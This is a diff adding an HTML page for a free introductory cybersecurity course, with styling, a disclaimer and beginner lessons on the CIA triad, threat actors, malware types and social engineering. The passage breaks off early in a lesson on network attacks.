@@ -1,0 +1,1734 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Learn Cybersecurity — TIMTIML by Anotida Manguwe</title>
+<meta name="description" content="Free Cybersecurity lessons by Anotida Manguwe (TIMTIML). Ethical hacking, malware, networks, cryptography, penetration testing and more. Cisco certified.">
+<style>
+  :root{--cyan:#00d4ff;--green:#00ff9d;--dark:#0a0e1a;--card:#0f1628;--card2:#141c35;--border:rgba(0,212,255,0.15);--text:#c8d8f0;--muted:#5a7090;--red:#ff4444;--accent:#ff6b35;}
+  *{margin:0;padding:0;box-sizing:border-box}html{scroll-behavior:smooth}
+  body{background:var(--dark);color:var(--text);font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif;line-height:1.7;overflow-x:hidden}
+  ::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:var(--dark)}::-webkit-scrollbar-thumb{background:var(--red);border-radius:3px}
+  .topbar{position:fixed;top:0;left:0;right:0;z-index:100;height:60px;display:flex;align-items:center;justify-content:space-between;padding:0 2rem;background:rgba(10,14,26,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border)}
+  .topbar-back{display:inline-flex;align-items:center;gap:6px;color:var(--muted);text-decoration:none;font-size:0.8rem;font-weight:600;letter-spacing:1px;text-transform:uppercase;transition:color .2s}.topbar-back:hover{color:var(--red)}
+  .topbar-title{font-size:1rem;font-weight:900;letter-spacing:1px;background:linear-gradient(90deg,#ff4444,#ff6b35);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+  .topbar-wa{display:inline-flex;align-items:center;gap:6px;background:#25D366;color:#fff;padding:7px 16px;border-radius:6px;font-size:0.78rem;font-weight:700;text-decoration:none}.topbar-wa:hover{background:#1ebe5d}
+  .lesson-hero{padding:100px 2rem 60px;max-width:900px;margin:0 auto;text-align:center}
+  .lang-badge{display:inline-block;background:rgba(255,68,68,0.1);border:1px solid rgba(255,68,68,0.4);color:#ff6b6b;font-size:0.72rem;font-weight:700;letter-spacing:3px;text-transform:uppercase;padding:5px 14px;border-radius:20px;margin-bottom:1.2rem}
+  .lesson-hero h1{font-size:clamp(2rem,5vw,3.2rem);font-weight:900;color:#fff;line-height:1.1;margin-bottom:1rem}
+  .lesson-hero h1 span{color:#ff6b35}
+  .lesson-hero > p{font-size:1rem;color:var(--muted);max-width:580px;margin:0 auto 2rem}
+  .hero-stats{display:flex;justify-content:center;gap:2.5rem;flex-wrap:wrap}
+  .stat{text-align:center}.stat-num{font-size:1.8rem;font-weight:900;color:#ff6b35;display:block}.stat-label{font-size:0.72rem;color:var(--muted);letter-spacing:1px;text-transform:uppercase}
+  .cs-switcher{display:flex;gap:0.6rem;flex-wrap:wrap;justify-content:center;margin-top:1.2rem}
+  .cs-switch-link{display:inline-flex;align-items:center;gap:5px;padding:7px 18px;border-radius:20px;font-size:0.78rem;font-weight:700;text-decoration:none;border:1px solid var(--border);color:var(--muted);transition:.2s}
+  .cs-switch-link:hover{border-color:var(--red);color:#ff6b6b}.cs-switch-link.current{border-color:var(--red);color:#ff6b35;background:rgba(255,68,68,0.07)}
+  .disclaimer{max-width:900px;margin:0 auto 0;padding:0 2rem}
+  .disclaimer-box{background:rgba(255,68,68,0.06);border:1px solid rgba(255,68,68,0.25);border-radius:8px;padding:12px 18px;display:flex;gap:0.8rem;align-items:flex-start;font-size:0.82rem}
+  .disclaimer-box p{color:var(--muted);line-height:1.6;margin:0}
+  .progress-wrap{max-width:900px;margin:1.5rem auto 0;padding:0 2rem 2rem}
+  .progress-label{font-size:0.75rem;color:var(--muted);margin-bottom:0.5rem;display:flex;justify-content:space-between}
+  .progress-bar{height:4px;background:rgba(255,255,255,0.07);border-radius:2px}
+  .progress-fill{height:100%;background:linear-gradient(90deg,#ff4444,#ff6b35);border-radius:2px;transition:width .5s ease}
+  .lesson-layout{display:grid;grid-template-columns:240px 1fr;gap:2rem;max-width:1100px;margin:0 auto;padding:0 2rem 80px}
+  .lesson-sidebar{position:sticky;top:80px;height:fit-content}
+  .sidebar-title{font-size:0.65rem;letter-spacing:3px;text-transform:uppercase;color:#ff6b35;font-weight:700;margin-bottom:1rem}
+  .sidebar-nav{list-style:none;display:flex;flex-direction:column;gap:0.3rem}
+  .sidebar-nav a{display:flex;align-items:center;gap:0.6rem;padding:8px 12px;border-radius:6px;text-decoration:none;font-size:0.82rem;color:var(--muted);transition:.2s;border:1px solid transparent}
+  .sidebar-nav a:hover,.sidebar-nav a.active{color:#ff6b35;border-color:rgba(255,107,53,0.25);background:rgba(255,107,53,0.07)}
+  .sidebar-num{font-size:0.65rem;color:var(--muted);font-weight:700;min-width:20px}
+  .lessons-list{display:flex;flex-direction:column;gap:1.2rem}
+  .lesson-card{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden;scroll-margin-top:80px}
+  .lesson-header{display:flex;align-items:center;gap:1rem;padding:1.2rem 1.8rem;cursor:pointer;user-select:none;transition:background .2s}.lesson-header:hover{background:rgba(255,107,53,0.04)}
+  .lesson-num-badge{font-size:0.62rem;font-weight:900;color:#ff6b35;letter-spacing:2px;background:rgba(255,107,53,0.1);border:1px solid rgba(255,107,53,0.3);padding:4px 9px;border-radius:4px;flex-shrink:0}
+  .lesson-heading{flex:1}.lesson-heading h3{font-size:0.98rem;font-weight:800;color:#fff;margin-bottom:2px}.lesson-heading span{font-size:0.72rem;color:var(--muted)}
+  .lesson-chevron{color:var(--muted);font-size:0.8rem;transition:transform .3s;flex-shrink:0}.lesson-chevron.open{transform:rotate(180deg);color:#ff6b35}
+  .done-badge{font-size:0.7rem;color:var(--green);background:rgba(0,255,157,0.1);border:1px solid rgba(0,255,157,0.25);padding:2px 8px;border-radius:10px;flex-shrink:0}
+  .lesson-body{display:none;padding:0 1.8rem 1.8rem;border-top:1px solid var(--border)}.lesson-body.open{display:block}
+  .lesson-body > p{color:var(--muted);font-size:0.9rem;line-height:1.8;margin:1.2rem 0 1rem}
+  .code-block{background:#0d1117;border:1px solid rgba(255,107,53,0.15);border-radius:10px;margin:1rem 0;overflow:hidden}
+  .code-header{display:flex;align-items:center;justify-content:space-between;padding:8px 16px;background:rgba(255,107,53,0.05);border-bottom:1px solid rgba(255,107,53,0.1)}
+  .code-lang{font-size:0.68rem;color:#ff6b35;font-weight:700;letter-spacing:1px;text-transform:uppercase}
+  .copy-btn{font-size:0.68rem;color:var(--muted);background:none;border:none;cursor:pointer;transition:color .2s;padding:0}.copy-btn:hover{color:#ff6b35}
+  pre{padding:1.2rem 1.4rem;font-family:'Courier New',Courier,monospace;font-size:0.82rem;line-height:1.8;color:#e6edf3;overflow-x:auto;white-space:pre}
+  .kw{color:#ff7b72}.str{color:#a5d6ff}.num{color:#79c0ff}.cm{color:#8b949e;font-style:italic}.hi{color:#ff6b35;font-weight:700}.g{color:#00ff9d}.r{color:#ff4444}
+  .tip-box{display:flex;gap:0.8rem;align-items:flex-start;background:rgba(0,212,255,0.06);border-left:3px solid var(--cyan);padding:12px 16px;border-radius:0 8px 8px 0;margin:1rem 0;font-size:0.85rem}
+  .tip-box.warning{background:rgba(255,200,0,0.06);border-left-color:#ffcc00}.tip-box.success{background:rgba(0,255,157,0.06);border-left-color:var(--green)}.tip-box.danger{background:rgba(255,68,68,0.06);border-left-color:#ff4444}
+  .tip-icon{font-size:1.1rem;flex-shrink:0;margin-top:1px}.tip-box p{color:var(--text);line-height:1.6;margin:0}.tip-box code{color:var(--cyan);background:rgba(0,212,255,0.1);padding:1px 5px;border-radius:3px;font-size:0.82rem}
+  .concept-grid{display:grid;grid-template-columns:1fr 1fr;gap:0.8rem;margin:1rem 0}
+  .concept-card{background:var(--card2);border:1px solid var(--border);border-radius:8px;padding:1rem;font-size:0.82rem}
+  .concept-card strong{color:#fff;display:block;margin-bottom:0.3rem;font-size:0.88rem}.concept-card span{color:var(--muted)}
+  .phase-steps{display:flex;flex-direction:column;gap:0.6rem;margin:1rem 0}
+  .phase-step{display:flex;gap:1rem;align-items:flex-start;padding:0.8rem 1rem;background:var(--card2);border-radius:8px;border-left:3px solid #ff6b35}
+  .phase-num{font-size:0.7rem;font-weight:900;color:#ff6b35;min-width:24px;padding-top:2px}
+  .phase-content strong{color:#fff;font-size:0.88rem}.phase-content span{color:var(--muted);font-size:0.82rem;display:block}
+  .lesson-footer{display:flex;align-items:center;gap:1rem;margin-top:1.5rem;flex-wrap:wrap}
+  .mark-done-btn{display:inline-flex;align-items:center;gap:6px;padding:8px 18px;border-radius:6px;font-size:0.78rem;font-weight:700;cursor:pointer;transition:.2s;border:1px solid rgba(0,255,157,0.3);background:rgba(0,255,157,0.07);color:var(--green)}.mark-done-btn:hover{background:rgba(0,255,157,0.15)}.mark-done-btn.done{background:rgba(0,255,157,0.2);border-color:var(--green)}
+  .next-btn{display:inline-flex;align-items:center;gap:6px;padding:8px 18px;border-radius:6px;font-size:0.78rem;font-weight:700;cursor:pointer;transition:.2s;border:none;background:linear-gradient(90deg,#ff4444,#ff6b35);color:#fff}.next-btn:hover{opacity:0.85}
+  .bottom-cta{max-width:900px;margin:2rem auto;padding:0 2rem 80px;text-align:center}
+  .cta-card{background:var(--card);border:1px solid rgba(37,211,102,0.25);border-radius:14px;padding:3rem 2rem}
+  .cta-card h2{color:#fff;font-size:1.6rem;font-weight:900;margin-bottom:0.6rem}.cta-card p{color:var(--muted);max-width:480px;margin:0 auto 2rem;font-size:0.9rem}
+  .cta-btns{display:flex;gap:1rem;justify-content:center;flex-wrap:wrap}
+  .cta-btn-main{display:inline-flex;align-items:center;gap:8px;background:#25D366;color:#fff;padding:14px 28px;border-radius:8px;font-weight:700;text-decoration:none;transition:.25s}.cta-btn-main:hover{background:#1ebe5d;transform:translateY(-2px)}
+  .cta-btn-sec{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--border);color:var(--text);padding:14px 28px;border-radius:8px;font-weight:700;text-decoration:none;transition:.25s}.cta-btn-sec:hover{border-color:#ff4444;color:#ff6b35}
+  @media(max-width:768px){.lesson-layout{grid-template-columns:1fr}.lesson-sidebar{display:none}.topbar{padding:0 1rem}.topbar-wa{display:none}.lesson-hero{padding:80px 1rem 40px}.lesson-body{padding:0 1.2rem 1.2rem}.lesson-header{padding:1rem 1.2rem}pre{font-size:0.75rem}.concept-grid{grid-template-columns:1fr}}
+
+  /* ── LESSON LOCKING ── */
+  .lesson-card.locked .lesson-header { cursor: not-allowed; opacity: 0.55; }
+  .lock-icon { margin-left: auto; font-size: 1.1rem; flex-shrink: 0; }
+  .locked-toast {
+    position: fixed; bottom: 90px; left: 50%; transform: translateX(-50%);
+    background: #1a1a2e; border: 1px solid #ff4757; color: #ff4757;
+    padding: 10px 22px; border-radius: 8px; font-size: 0.85rem; font-weight: 700;
+    z-index: 9999; pointer-events: none; opacity: 0;
+    transition: opacity .3s; white-space: nowrap;
+  }
+  .locked-toast.show { opacity: 1; }
+
+  /* ── QUIZ ── */
+  .quiz-section {
+    margin-top: 1.8rem; padding-top: 1.5rem;
+    border-top: 1px dashed var(--border);
+  }
+  .quiz-title {
+    font-size: 0.72rem; font-weight: 800; letter-spacing: 3px;
+    text-transform: uppercase; color: var(--cyan); margin-bottom: 1.2rem;
+    display: flex; align-items: center; gap: 0.5rem;
+  }
+  .quiz-q { margin-bottom: 1.4rem; }
+  .quiz-q-text { font-size: 0.9rem; color: #fff; font-weight: 700; margin-bottom: 0.7rem; line-height: 1.5; }
+  .quiz-q-num { color: var(--muted); font-size: 0.8rem; margin-bottom: 0.3rem; }
+  .quiz-opt {
+    display: flex; align-items: center; gap: 0.7rem;
+    padding: 9px 14px; border-radius: 7px; cursor: pointer;
+    border: 1px solid var(--border); margin-bottom: 0.5rem;
+    font-size: 0.86rem; color: var(--text); transition: .18s; user-select: none;
+  }
+  .quiz-opt:hover:not(.quiz-revealed) { border-color: var(--cyan); background: rgba(0,212,255,0.06); }
+  .quiz-opt.selected:not(.quiz-revealed) { border-color: var(--cyan); background: rgba(0,212,255,0.1); }
+  .quiz-opt.correct  { border-color: var(--green) !important; background: rgba(0,255,157,0.12) !important; color: var(--green); font-weight: 700; }
+  .quiz-opt.wrong    { border-color: #ff4757 !important; background: rgba(255,71,87,0.1) !important; color: #ff4757; }
+  .quiz-opt .opt-circle {
+    width: 20px; height: 20px; border-radius: 50%; border: 2px solid var(--border);
+    flex-shrink: 0; display: flex; align-items: center; justify-content: center;
+    font-size: 0.65rem; font-weight: 900; transition: .18s;
+  }
+  .quiz-opt.selected .opt-circle { border-color: var(--cyan); background: var(--cyan); color: #000; }
+  .quiz-opt.correct  .opt-circle { border-color: var(--green); background: var(--green); color: #000; }
+  .quiz-opt.wrong    .opt-circle { border-color: #ff4757; background: #ff4757; color: #fff; }
+  .quiz-submit-btn {
+    margin-top: 0.5rem; padding: 10px 24px; border-radius: 7px; border: none;
+    background: linear-gradient(90deg, var(--cyan), var(--green));
+    color: #000; font-weight: 800; font-size: 0.85rem; cursor: pointer;
+    transition: .2s; letter-spacing: 0.5px;
+  }
+  .quiz-submit-btn:hover { opacity: 0.85; }
+  .quiz-submit-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+  .quiz-result {
+    margin-top: 1.2rem; padding: 14px 18px; border-radius: 8px; font-size: 0.9rem; font-weight: 700;
+  }
+  .quiz-result.pass { background: rgba(0,255,157,0.1); border: 1px solid var(--green); color: var(--green); }
+  .quiz-result.fail { background: rgba(255,71,87,0.08); border: 1px solid #ff4757; color: #ff6b6b; }
+  .quiz-retry-btn {
+    margin-top: 0.8rem; padding: 8px 18px; border-radius: 6px; border: 1px solid #ff4757;
+    background: none; color: #ff4757; font-size: 0.8rem; font-weight: 700; cursor: pointer; transition: .2s;
+  }
+  .quiz-retry-btn:hover { background: rgba(255,71,87,0.1); }
+
+
+  /* ══ GATE MODALS ══ */
+  .gate-overlay {
+    position: fixed; inset: 0; z-index: 8000;
+    background: rgba(5,8,20,0.92);
+    display: flex; align-items: center; justify-content: center;
+    backdrop-filter: blur(6px); padding: 1rem;
+    animation: gateFadeIn .25s ease;
+  }
+  @keyframes gateFadeIn { from{opacity:0} to{opacity:1} }
+
+  .gate-modal {
+    background: #0f1628; border: 1px solid rgba(0,212,255,0.25);
+    border-radius: 16px; padding: 2.5rem 2rem;
+    width: 100%; max-width: 480px; max-height: 90vh;
+    overflow-y: auto; position: relative;
+    box-shadow: 0 0 60px rgba(0,212,255,0.12);
+    animation: gateSlideUp .3s ease;
+  }
+  .gate-modal-wide { max-width: 620px; }
+  @keyframes gateSlideUp { from{transform:translateY(20px);opacity:0} to{transform:translateY(0);opacity:1} }
+
+  .gate-icon-wrap { text-align: center; margin-bottom: 1rem; }
+  .gate-icon { font-size: 2.8rem; }
+  .gate-title { font-size: 1.4rem; font-weight: 900; color: #fff; text-align: center; margin-bottom: 0.5rem; }
+  .gate-sub { color: var(--muted); font-size: 0.88rem; text-align: center; margin-bottom: 1.8rem; line-height: 1.6; }
+
+  .gate-field-group { margin-bottom: 1rem; }
+  .gate-label { display: block; font-size: 0.72rem; font-weight: 700; color: var(--cyan); letter-spacing: 1px; text-transform: uppercase; margin-bottom: 0.4rem; }
+  .gate-input {
+    width: 100%; background: #141c35; border: 1px solid rgba(0,212,255,0.18);
+    border-radius: 8px; padding: 11px 14px; color: var(--text); font-size: 0.9rem;
+    outline: none; font-family: inherit; transition: border-color .2s;
+  }
+  .gate-input:focus { border-color: var(--cyan); }
+  .gate-select { appearance: none; cursor: pointer; }
+  .gate-phone-row { display: flex; gap: 0.5rem; }
+
+  .gate-btn {
+    width: 100%; padding: 13px; border-radius: 8px; border: none;
+    background: linear-gradient(90deg, var(--cyan), var(--green));
+    color: #000; font-size: 0.92rem; font-weight: 800; cursor: pointer;
+    transition: .25s; margin-top: 0.5rem; letter-spacing: 0.5px;
+  }
+  .gate-btn:hover { opacity: 0.88; transform: translateY(-1px); }
+  .gate-btn-wa { background: #25D366; color: #fff; text-decoration: none; display: block; text-align: center; }
+  .gate-btn-wa:hover { background: #1ebe5d; }
+
+  .gate-small { font-size: 0.75rem; color: var(--muted); text-align: center; margin-top: 0.8rem; }
+  .gate-error { background: rgba(255,71,87,0.1); border: 1px solid #ff4757; border-radius: 6px; padding: 10px 14px; font-size: 0.83rem; color: #ff6b6b; margin-top: 0.5rem; }
+
+  .gate-success-box { background: rgba(0,255,157,0.07); border: 1px solid rgba(0,255,157,0.25); border-radius: 10px; padding: 1.8rem; text-align: center; margin-bottom: 1.2rem; }
+  .gate-success-box strong { color: #fff; display: block; font-size: 1.1rem; margin-bottom: 0.4rem; }
+  .gate-success-box p { color: var(--muted); font-size: 0.88rem; }
+
+  .gate-grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 0.8rem; }
+
+  .gate-amount-box { background: rgba(0,212,255,0.06); border: 1px solid rgba(0,212,255,0.2); border-radius: 10px; padding: 1.2rem; text-align: center; margin: 1rem 0; }
+  .gate-amount-label { font-size: 0.7rem; letter-spacing: 2px; text-transform: uppercase; color: var(--muted); margin-bottom: 0.4rem; }
+  .gate-amount-value { font-size: 2rem; font-weight: 900; color: var(--cyan); }
+  .gate-amount-equiv { font-size: 0.78rem; color: var(--muted); margin-top: 0.3rem; }
+
+  .gate-methods-box { background: #141c35; border: 1px solid var(--border); border-radius: 8px; padding: 1rem; margin-bottom: 1rem; }
+  .gate-methods-title { font-size: 0.78rem; font-weight: 700; color: #fff; margin-bottom: 0.6rem; }
+  .gate-methods-list { display: flex; flex-wrap: wrap; gap: 0.4rem; }
+  .gate-method-tag { background: rgba(0,212,255,0.08); border: 1px solid rgba(0,212,255,0.2); border-radius: 4px; padding: 3px 10px; font-size: 0.72rem; color: var(--cyan); font-weight: 600; }
+
+  .gate-proof-box { background: #141c35; border: 1px solid var(--border); border-radius: 10px; padding: 1.5rem; text-align: center; margin-bottom: 1.2rem; }
+  .gate-proof-box strong { color: #fff; display: block; font-size: 1rem; margin-bottom: 0.4rem; }
+  .gate-proof-box p { color: var(--muted); font-size: 0.85rem; margin-bottom: 1rem; }
+  .gate-ref-display { background: #0a0e1a; border: 1px dashed var(--cyan); border-radius: 8px; padding: 10px; margin-bottom: 1rem; }
+  .gate-ref-label { font-size: 0.7rem; color: var(--muted); display: block; margin-bottom: 3px; }
+  .gate-ref-code { font-size: 1.6rem; font-weight: 900; color: var(--cyan); letter-spacing: 4px; font-family: 'Courier New', monospace; }
+
+  .gate-divider { text-align: center; color: var(--muted); font-size: 0.78rem; margin: 1.2rem 0; position: relative; }
+  .gate-divider::before,.gate-divider::after { content:''; position:absolute; top:50%; width:40%; height:1px; background:var(--border); }
+  .gate-divider::before { left:0; } .gate-divider::after { right:0; }
+
+  .gate-code-section { background: #141c35; border: 1px solid rgba(0,255,157,0.15); border-radius: 10px; padding: 1.5rem; text-align: center; }
+  .gate-code-input { font-family: 'Courier New', monospace !important; }
+
+  @media(max-width:640px){
+    .gate-grid-2 { grid-template-columns: 1fr; }
+    .gate-modal { padding: 1.8rem 1.2rem; }
+    .gate-phone-row { flex-direction: column; }
+  }
+
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <a class="topbar-back" href="./index.html">← Back to Home</a>
+  <span class="topbar-title">🔐 Cybersecurity</span>
+  <a class="topbar-wa" href="https://wa.me/260768648291?text=Hi%20Anotida!%20I%20want%20to%20learn%20Cybersecurity%20with%20you." target="_blank">💬 Ask Anotida</a>
+</div>
+
+<div class="lesson-hero">
+  <div class="lang-badge">🔐 Ethical Hacking & Cybersecurity</div>
+  <h1>Learn <span>Cybersecurity</span><br>with Anotida</h1>
+  <p>From understanding threats to ethical hacking techniques — 8 in-depth lessons covering everything from malware and cryptography to penetration testing. Cisco-certified knowledge, taught clearly.</p>
+  <div class="hero-stats">
+    <div class="stat"><span class="stat-num">8</span><span class="stat-label">Lessons</span></div>
+    <div class="stat"><span class="stat-num">Free</span><span class="stat-label">Always</span></div>
+    <div class="stat"><span class="stat-num">Cisco</span><span class="stat-label">Certified Tutor</span></div>
+  </div>
+  <div class="cs-switcher">
+    <a class="cs-switch-link current" href="cybersecurity.html">🔐 Cybersecurity</a>
+    <a class="cs-switch-link" href="olevel-cs.html">📗 O Level CS</a>
+    <a class="cs-switch-link" href="alevel-cs.html">📘 A Level CS</a>
+    <a class="cs-switch-link" href="python-lessons.html">🐍 Python</a>
+    <a class="cs-switch-link" href="c-lessons.html">⚙️ C</a>
+  </div>
+</div>
+
+<div class="disclaimer">
+  <div class="disclaimer-box">
+    <span style="font-size:1.2rem;flex-shrink:0">⚠️</span>
+    <p><strong style="color:#ff6b6b">Educational purposes only.</strong> All techniques and tools covered here are for learning, understanding defences, and ethical/legal use only — on systems you own or have written permission to test. Unauthorised hacking is illegal and unethical.</p>
+  </div>
+</div>
+
+<div class="progress-wrap">
+  <div class="progress-label"><span>Your progress</span><span id="progress-text">0 / 8 lessons</span></div>
+  <div class="progress-bar"><div class="progress-fill" id="progress-fill" style="width:0%"></div></div>
+</div>
+
+<div class="lesson-layout">
+  <aside class="lesson-sidebar">
+    <div class="sidebar-title">📚 Lessons</div>
+    <ul class="sidebar-nav">
+      <li><a href="#lesson1"><span class="sidebar-num">01</span> Cybersecurity Fundamentals</a></li>
+      <li><a href="#lesson2"><span class="sidebar-num">02</span> Types of Malware</a></li>
+      <li><a href="#lesson3"><span class="sidebar-num">03</span> Network Security</a></li>
+      <li><a href="#lesson4"><span class="sidebar-num">04</span> Cryptography</a></li>
+      <li><a href="#lesson5"><span class="sidebar-num">05</span> Ethical Hacking Phases</a></li>
+      <li><a href="#lesson6"><span class="sidebar-num">06</span> Scanning &amp; Enumeration</a></li>
+      <li><a href="#lesson7"><span class="sidebar-num">07</span> Web Application Security</a></li>
+      <li><a href="#lesson8"><span class="sidebar-num">08</span> Defence &amp; Incident Response</a></li>
+    </ul>
+  </aside>
+
+  <main class="lessons-list">
+
+    <!-- LESSON 1 -->
+    <div class="lesson-card" id="lesson1">
+      <div class="lesson-header" onclick="toggle(1)">
+        <span class="lesson-num-badge">01</span>
+        <div class="lesson-heading"><h3>Cybersecurity Fundamentals — The CIA Triad</h3><span>CIA triad, threat actors, attack surface · ~8 min</span></div>
+        <span class="done-badge" id="done1" style="display:none">✓ Done</span>
+        <span class="lesson-chevron" id="chev1">▼</span>
+        <span class="lock-icon" id="lock-icon-1"></span>
+      </div>
+      <div class="lesson-body" id="body1">
+        <p>Cybersecurity is the practice of <strong style="color:#fff">protecting systems, networks and data</strong> from digital attacks. Everything in security is built on three core principles — the CIA Triad.</p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">The CIA Triad</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre><span class="hi">C — Confidentiality</span>
+  Only authorised people can access information.
+  Broken by: data breaches, eavesdropping, phishing
+  Protected by: encryption, access controls, 2FA
+
+<span class="hi">I — Integrity</span>
+  Data must not be altered without authorisation.
+  Broken by: man-in-the-middle attacks, tampering
+  Protected by: hashing, digital signatures, checksums
+
+<span class="hi">A — Availability</span>
+  Systems must be accessible when needed.
+  Broken by: DDoS attacks, ransomware, hardware failure
+  Protected by: backups, redundancy, load balancing</pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">Types of Threat Actors</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre><span class="hi">Script Kiddies</span>
+  Low skill — use pre-made tools without understanding.
+  Motivation: thrill, showing off.
+
+<span class="hi">Hacktivists</span>
+  Hack for political/social causes.
+  e.g. Anonymous defacing government websites.
+
+<span class="hi">Cybercriminals</span>
+  Motivated by money. Most common threat.
+  e.g. ransomware gangs, bank fraud, identity theft.
+
+<span class="hi">Nation-State Actors</span>
+  Government-sponsored hackers. Most sophisticated.
+  Target: critical infrastructure, espionage.
+
+<span class="hi">Insider Threats</span>
+  Employees or contractors with inside access.
+  Most dangerous — already past the perimeter.
+
+<span class="cm">── Hacker classifications ──</span>
+<span class="g">White Hat</span>  — ethical hackers, work with permission
+<span class="hi">Grey Hat</span>   — no permission but no malicious intent  
+<span class="r">Black Hat</span>  — criminal hackers, malicious intent</pre>
+        </div>
+
+        <div class="tip-box">
+          <span class="tip-icon">💡</span>
+          <p>The <strong>attack surface</strong> is the total set of points where an attacker can try to enter a system — every open port, web form, user account, and USB port counts. Reducing the attack surface is the first step in security.</p>
+        </div>
+        
+        <div class="quiz-section" id="quiz-1">
+          <div class="quiz-title">📝 Lesson 1 Quiz — Score 85%+ to proceed</div>
+          <div id="quiz-opts-1"></div>
+          <button class="quiz-submit-btn" id="quiz-submit-1" onclick="submitQuiz(1)">Submit Answers</button>
+          <div class="quiz-result" id="quiz-result-1" style="display:none"></div>
+        </div>
+        <div class="lesson-footer">
+          <button class="mark-done-btn" id="btn1" onclick="markDone(1)">✓ Mark as Done</button>
+          <button class="next-btn" onclick="openNext(2)">Next: Malware →</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- LESSON 2 -->
+    <div class="lesson-card" id="lesson2">
+      <div class="lesson-header" onclick="toggle(2)">
+        <span class="lesson-num-badge">02</span>
+        <div class="lesson-heading"><h3>Types of Malware &amp; Attack Methods</h3><span>virus, worm, trojan, ransomware, phishing, social engineering · ~10 min</span></div>
+        <span class="done-badge" id="done2" style="display:none">✓ Done</span>
+        <span class="lesson-chevron" id="chev2">▼</span>
+        <span class="lock-icon" id="lock-icon-2"></span>
+      </div>
+      <div class="lesson-body" id="body2">
+        <p><strong style="color:#fff">Malware</strong> (malicious software) is any software designed to harm, exploit, or gain unauthorised access to systems. Understanding each type is essential for building effective defences.</p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">Malware Types</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre><span class="hi">Virus</span>
+  Attaches to legitimate files. Spreads when file runs.
+  Requires human action to spread (opening a file).
+  Can corrupt or delete data.
+
+<span class="hi">Worm</span>
+  Self-replicates across networks WITHOUT human action.
+  Famous: WannaCry, Conficker, ILOVEYOU
+  Can exhaust bandwidth and crash systems.
+
+<span class="hi">Trojan</span>
+  Disguises itself as legitimate software.
+  Once installed, opens a backdoor for the attacker.
+  e.g. fake antivirus, cracked games/software.
+
+<span class="hi">Ransomware</span>
+  Encrypts your files. Demands payment for the key.
+  Famous: WannaCry (2017) — hit hospitals worldwide.
+  Defence: offline backups, updated systems.
+
+<span class="hi">Spyware</span>
+  Silently monitors activity — keystrokes, screenshots.
+  Sends data to attacker without your knowledge.
+
+<span class="hi">Rootkit</span>
+  Hides deep in the OS, often at kernel level.
+  Extremely difficult to detect and remove.
+
+<span class="hi">Keylogger</span>
+  Records every keypress — captures passwords, PINs.
+  Can be software or hardware (physical USB device).
+
+<span class="hi">Botnet</span>
+  Network of infected "zombie" computers.
+  Controlled remotely for DDoS, spam, cryptomining.</pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">Social Engineering Attacks</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre"><span class="hi">Phishing</span>
+  Fake emails pretending to be banks, services, bosses.
+  Goal: steal credentials or install malware.
+  Spear phishing = targeted at specific person.
+  Whaling = targeted at executives/CEOs.
+
+<span class="hi">Vishing</span>
+  Voice phishing — fake phone calls.
+  e.g. "This is your bank, we need to verify your PIN."
+
+<span class="hi">Smishing</span>
+  SMS phishing — fake text messages with malicious links.
+
+<span class="hi">Pretexting</span>
+  Attacker creates a fake scenario to extract info.
+  e.g. posing as IT support to get your password.
+
+<span class="hi">Baiting</span>
+  Leaving infected USB drives in car parks.
+  Curious people plug them in — instant infection.
+
+<span class="hi">Tailgating</span>
+  Physically following someone into a secure building.</pre>
+        </div>
+
+        <div class="tip-box danger">
+          <span class="tip-icon">🛡️</span>
+          <p><strong>Key defence:</strong> Most attacks target people, not technology. Security awareness training is often more valuable than expensive software. Always verify before clicking, and question urgency — attackers rely on panic.</p>
+        </div>
+        
+        <div class="quiz-section" id="quiz-2">
+          <div class="quiz-title">📝 Lesson 2 Quiz — Score 85%+ to proceed</div>
+          <div id="quiz-opts-2"></div>
+          <button class="quiz-submit-btn" id="quiz-submit-2" onclick="submitQuiz(2)">Submit Answers</button>
+          <div class="quiz-result" id="quiz-result-2" style="display:none"></div>
+        </div>
+        <div class="lesson-footer">
+          <button class="mark-done-btn" id="btn2" onclick="markDone(2)">✓ Mark as Done</button>
+          <button class="next-btn" onclick="openNext(3)">Next: Network Security →</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- LESSON 3 -->
+    <div class="lesson-card" id="lesson3">
+      <div class="lesson-header" onclick="toggle(3)">
+        <span class="lesson-num-badge">03</span>
+        <div class="lesson-heading"><h3>Network Security — Firewalls, VPNs &amp; Protocols</h3><span>firewall, IDS, IPS, VPN, DMZ, TCP/IP · ~11 min</span></div>
+        <span class="done-badge" id="done3" style="display:none">✓ Done</span>
+        <span class="lesson-chevron" id="chev3">▼</span>
+        <span class="lock-icon" id="lock-icon-3"></span>
+      </div>
+      <div class="lesson-body" id="body3">
+        <p>Network security is about <strong style="color:#fff">protecting data in transit</strong> and controlling who can access what within a network. Most cyberattacks travel through networks — understanding how they work is crucial.</p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">Network Attack Types</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre><span class="hi">DDoS — Distributed Denial of Service</span>
+  Floods a server with traffic from thousands of IPs.
+  Server becomes overwhelmed — legitimate users can't connect.
+  Botnet of infected computers sends the traffic.
+
+<span class="hi">Man-in-the-Middle (MITM)</span>
+  Attacker secretly intercepts communication between two parties.
+  e.g. on public Wi-Fi — attacker reads unencrypted traffic.
